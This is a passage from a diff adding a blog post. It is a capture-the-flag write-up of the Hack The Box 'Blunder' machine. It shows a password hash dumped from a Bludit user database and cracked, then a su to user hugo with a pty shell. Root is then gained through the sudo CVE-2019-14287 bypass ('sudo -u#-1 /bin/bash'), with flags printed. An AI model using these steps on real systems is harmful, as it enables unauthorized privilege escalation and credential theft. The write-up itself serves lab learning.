+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;User&#34;</span>,
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;faca404fd5c0a31cf1897b823c695c85cffeb98d&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;registered&#34;</span>: <span style="color:#e6db74">&#34;2019-11-27 07:40:55&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenRemember&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenAuth&#34;</span>: <span style="color:#e6db74">&#34;b380cb62057e9da47afce66b4615107d&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tokenAuthTTL&#34;</span>: <span style="color:#e6db74">&#34;2009-03-15 14:00&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;twitter&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;facebook&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;instagram&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;codepen&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;linkedin&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;github&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;gitlab&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div>
+<p>Bingo, now lets plug and chug this password into <a href="https://crackstation.net/">https://crackstation.net</a> to automatically detect the hash and crack it.</p>
+<figure><img src="/img/blunder/crackStation.PNG"
+         alt="CrackStation"/>
+</figure>
+
+<h2 id="su-hugo">su hugo</h2>
+<p>Now we have a simple password for hugo: <code>Password120</code>
+Let&rsquo;s try to <code>su</code> to <code>hugo</code> and promptly upgrade our shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
+</span></span><span style="display:flex;"><span>su hugo
+</span></span><span style="display:flex;"><span>Password: Password120
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd ~
+</span></span><span style="display:flex;"><span>cd ~
+</span></span><span style="display:flex;"><span>hugo@blunder:~$ cat user.txt
+</span></span><span style="display:flex;"><span>cat user.txt
+</span></span><span style="display:flex;"><span>b97bf46c276ccef0d46c9cce0e9db46d
+</span></span><span style="display:flex;"><span>hugo@blunder:~$ </span></span></code></pre></div>
+<h1 id="privesc-hugo---root">PrivEsc: hugo -&gt; root</h1>
+<h2 id="enumeration-2">Enumeration</h2>
+<p>The first step when gaining user level access should always be to try out <code>sudo -l</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hugo@blunder:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> hugo on blunder:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User hugo may run the following commands on blunder:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /bin/bash</span></span></code></pre></div>
+<p>So this means that anybody, except for root, can execute <code>/bin/bash</code>. Which isn&rsquo;t optimal for our goals.</p>
+<h2 id="cve-2019-14287">CVE-2019-14287</h2>
+<p>Here we arrive at my favorite part of this box. A vulerability that is present in versions of sudo earlier than <code>1.8.28</code> that allows anybody with sudoer access to bypass any sudoer blacklists. Blacklists such as <code>!root</code>, how convenient&hellip;</p>
+<p>Let&rsquo;s check the sudo version to confirm our suspicion.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hugo@blunder:~$ sudo --version
+</span></span><span style="display:flex;"><span>sudo --version
+</span></span><span style="display:flex;"><span>Sudo version 1.8.25p1
+</span></span><span style="display:flex;"><span>Sudoers policy plugin version 1.8.25p1
+</span></span><span style="display:flex;"><span>Sudoers file grammar version <span style="color:#ae81ff">46</span>
+</span></span><span style="display:flex;"><span>Sudoers I/O plugin version 1.8.25p1</span></span></code></pre></div>
+<p>Well would you look at that. To showcase expected behavior, we&rsquo;ll attempt to explicitly execute <code>sudo /bin/bash</code> as the root user. Note that root is always set with <code>uid 0</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hugo@blunder:~$ sudo -u#0 /bin/bash
+</span></span><span style="display:flex;"><span>Sorry, user hugo is not allowed to execute <span style="color:#e6db74">&#39;/bin/bash&#39;</span> as root on blunder.</span></span></code></pre></div>
+<p>Excellent, so <code>hugo</code> is not allowed to execute <code>/bin/bash</code> as <code>root</code>. So what we&rsquo;re going to do now is use <code>hugo</code> to execute <code>/bin/bash</code> as <code>root</code>.</p>
+<p>#Pwned
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hugo@blunder:~$ sudo -u#-1 /bin/bash
+</span></span><span style="display:flex;"><span>sudo -u#-1 /bin/bash
+</span></span><span style="display:flex;"><span>root@blunder:/home/hugo# cd /root
+</span></span><span style="display:flex;"><span>cd /root
+</span></span><span style="display:flex;"><span>root@blunder:/root# cat root.txt
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>2996cd458fe42a43f5b58bb1e72ad907</span></span></code></pre></div></p>
+<p>Now we can see the results of such a hilariously disastrous one-liner. This box is the sole reason I now check for the <code>sudo</code> version anytime I&rsquo;m attempting to priv esc to root. I can confidentally say this is one of my favorite boxes, despite it being &ldquo;easy&rdquo;, purely for this fact it&rsquo;s added a permanent step to my enumeration process for the better.</p>
+</div>
+        </div>
+    </div>
+    
+            </div>
+        </div><footer class="bg-red-dark text-white p-6">
+    
+    <div class="container max-w-screen-xl mr-auto ml-auto">
+        <p>&copy; 2022 <a href="https://0xHippo.github.io/" class="duration-200 hover:opacity-50">0xHippo&#39;s Blog</a></p>
+        <p>Powered by <a href="https://gohugo.io/" class="duration-200 hover:opacity-50">Hugo</a>, Theme <a
+                href="https://github.com/opera7133/Blonde" class="duration-200 hover:opacity-50">Blonde</a>.</p>
+    </div>
+    <script>
+        var icon = document.getElementById("icon");
+        var icon2 = document.getElementById("icon2");
+        
+        if (document.documentElement.classList.contains("dark") || localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+          icon.classList.remove("icon-moon");
+          icon.classList.add("icon-sun");
+          icon2.classList.remove("icon-moon");
+          icon2.classList.add("icon-sun");
+          document.documentElement.classList.add('dark')
+        } else {
+          document.documentElement.classList.remove('dark')
+        }
+        function toggleDarkMode() {
+        if (document.documentElement.classList.contains('dark')) {
+            icon.classList.remove("icon-sun");
+            icon.classList.add("icon-moon");
+            icon2.classList.remove("icon-sun");
+            icon2.classList.add("icon-moon");
+            document.documentElement.classList.remove('dark')
+            localStorage.theme = 'light'
+        } else {
+            icon.classList.remove("icon-moon");
+            icon.classList.add("icon-sun");
+            icon2.classList.remove("icon-moon");
+            icon2.classList.add("icon-sun");
+            document.documentElement.classList.add('dark')
+            localStorage.theme = 'dark'
+        }
+    }
+    </script>
+</footer>
+</div>
+</body>
+
+</html>
